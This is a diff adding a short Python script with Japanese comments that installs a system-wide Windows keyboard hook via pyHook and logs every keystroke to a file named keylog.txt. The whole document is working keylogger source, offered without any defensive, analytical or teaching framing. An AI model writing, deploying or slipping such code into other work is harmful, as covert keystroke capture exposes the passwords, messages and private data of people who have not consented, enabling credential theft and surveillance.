@@ -1,0 +1,19 @@
+import pythoncom
+import pyHook
+import logging
+
+# ログファイルのパス
+LOG_FILE = "keylog.txt"
+
+def OnKeyboardEvent(event):
+    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(message)s')
+    logging.log(10, chr(event.Ascii))
+    return True
+
+# フックを設定
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
+
+# イベントループを開始
+pythoncom.PumpMessages()
